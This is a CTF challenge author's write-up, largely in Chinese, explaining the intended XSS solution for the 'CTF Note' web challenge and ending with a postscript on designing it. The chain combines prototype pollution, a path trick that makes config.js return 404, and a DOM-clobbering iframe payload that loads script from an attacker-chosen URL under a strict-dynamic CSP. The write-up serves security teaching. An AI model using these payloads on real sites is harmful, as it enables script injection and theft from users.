# CTF Note

- Category: Web
- Solves: 0 / 95 (scores >= 1), 55 (scores > 1)

## Solution

### TL;DR
1. Use `category` to prototype pollution that markdown.js library: write arbitrary HTML
2. Use `/whatever/..%2f` to make `config.js` 404
3. DOM Clobbering: create a nyanCat plugin yourself, load arbitrary js
4. XSS!

### Detailed Solution

總之這是一個可以發 writeup 的網站，其中我們可以為每個題目設定：類別、名稱、writeup 內容，而 writeup 的部分是使用 [markdown.js](https://github.com/evilstreak/markdown-js) 這個 library render 的。

第一個會發現的問題是：雖然前端限制了 `category` 部分的值，但後端並沒有驗證，是可以寫任意值的。這樣會有什麼問題呢？`app.js:65` 有這樣的一行程式：
```javascript
WriteUps[writeup.category][writeup.challenge] = writeup.content;
```
那如果我們將某題的 `category` 設定為 `__proto__`，就可以順利進行 prototype pollution 了。

知道這件事後應該可以很快地發現：一旦成功污染了 `Object` 的 prototype，會導致 markdown render 出來的每個 element 都被加上 `[challenge]=[content]` 的 attribute，而 `challenge`（也就是 attribute name）的部分是不會被 HTML escape 掉的，可以寫入任意 HTML。

不過由於有嚴格的 CSP 限制，我們目前還做不到 XSS
```
Content-Security-Policy:
	default-src 'none'; base-uri 'none'; img-src 'self'; style-src 'self'; connect-src 'self'; script-src 'strict-dynamic' 'nonce-[hex]'
```

這邊比較值得一提的是 `script-src 'strict-dynamic' 'nonce-{hex}'` 的意義：
- nonce-{hex} 限制了只能載入有帶特定 nonce 的 script element 的 JavaScript。
- 'strict-dynamic' 可以參考 [CSP Reference](https://content-security-policy.com/strict-dynamic/)；以這個場景而言，它會允許有帶 nonce 的 script 元素插入任何 script element 並執行其 js。

而這題 `app.js` 中的 `loadPlugin` function 恰好符合這個條件可以載入 script
```javascript
function loadPlugin(pluginName) {
    if (!(pluginName in CONFIG.plugins)) return;
    let script = document.createElement('script');
    script.src = CONFIG.plugins[pluginName];
    document.body.appendChild(script);
}
```
但如我們所見，它傳入了 `pluginName`，並從 `CONFIG.plugins[pluginName]` 裏讀出 js 路徑。因此想要任意載入自己的 js，就必須先控制 `CONFIG`；而 `CONFIG` 是從 `config.js` 裏載入的：

```javascript
const CONFIG = {
    productName: "CTF Note",
    version: "v0.0.87",
    plugins: {
        nyanCat: '/plugins/nyan.js',
        xssSimulator: '/plugins/xss.js'
    }
};
```

這時候我們可以回頭看看任意寫入 HTML 能幫助我們做到什麼事情吧！

有一個技巧叫做 DOM clobbering（各種技巧可以參考 [PortSwigger 的文章](https://portswigger.net/research/dom-clobbering-strikes-back)），是一種透過操作 DOM 並藉此劫持 js 中數值（基本上是全域變數）的技巧。

顯然的，我們想要控制的是 `CONFIG` 這個東西，但問題是直接 DOM clobbering 蓋不掉現有的變數啊，怎麼辦呢？簡單，只要把它弄不見就好了！

其實應該可以發現 `config.js` 在 HTML 中引入的寫法和其他 js、css 是有點不一樣的，別人都是 `/static` 底下的絕對路徑，但 `config.js` 卻是相對路徑的寫法。
```html
<script nonce="nonce" src="config.js"></script>
```

我們可以利用這點讓 config.js 404，怎麼做到呢？由於 nginx 和瀏覽器解析路徑的方法有些不同，因此可以構造出一個 nginx 讀得到，但瀏覽器卻讀不到的路徑：
```
http://ctf-note.splitline.tw:9527/meow/..%2f
```
- 對於 nginx 而言，它會因為 `..%2f` 返回上一層目錄，順利顯示出 / 該有的內容。
- 對於瀏覽器而言，`..%2f` 只是 `meow` 目錄下的一個檔案名稱，因此以相對路徑而言會讀到 `/meow/config.js`。

如此一來 config.js 就 404 not found 了，順利使 `CONFIG` 消失。

接下來就再回到 DOM clobbering，我們可以使用 iframe + srcdoc 的方法構造出 `CONFIG.plugins.nyanCat`：

```html
<iframe name=CONFIG srcdoc="
    <iframe id=CONFIG name=plugins
        srcdoc='<a id=nyanCat href=http://url/to/your.js>test</a>'>
"></iframe>
```

至此，我們已經能成功塞進去自己的 js，達成 full XSS！實際攻擊腳本可以參考 `solution.py`。


## Postscript

個人覺得這題是這場 CTF 中我出的題目裡我最喜歡的一題，一開始想到要把 prototype pollution 跟 DOM clobbering 結合在一起就出了這題，其實也是花了蠻多時間設計題目場景。話說回來這也是我第一次正式出 XSS 題，真的是蠻累的，前端、後端以及 xss bot 全都要認真設計，如果是純後端題的話前端可以隨便寫就好了 XD

感覺很多人都差最後一步了，卡在不知道怎麼蓋掉 config.js，最後沒人解出還是覺得有點可惜，本來是希望能有一～二隊解的 XD